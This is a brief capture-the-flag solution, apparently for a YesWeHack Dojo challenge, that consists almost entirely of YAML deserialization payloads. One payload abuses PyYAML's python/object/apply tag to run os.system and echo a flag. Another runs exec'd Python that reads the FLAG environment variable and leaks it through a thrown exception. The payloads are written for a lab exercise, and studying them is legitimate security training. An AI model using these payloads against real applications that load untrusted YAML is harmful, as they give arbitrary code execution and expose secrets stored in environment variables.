
````bash
curl -sI https://dojo-yeswehack.com | grep -i '^date:' | cut -d' ' -f2-
````
## solve 1 
````bash
firmware:
  version: !!python/object/apply:os.system
  - |
    echo $FLAG
````

## solve2 
````bash
firmware:
  version: !!python/object/apply:builtins.exec 
  - |
    import threading
    def leak_flag():
        import os
        flag = os.environ.get("FLAG", "no_flag")
        raise Exception(f"FLAG_LEAK: {flag}")
    threading.Thread(target=leak_flag).start() # starting thread in server context triggers error relfected in output server (see snippet below)
````
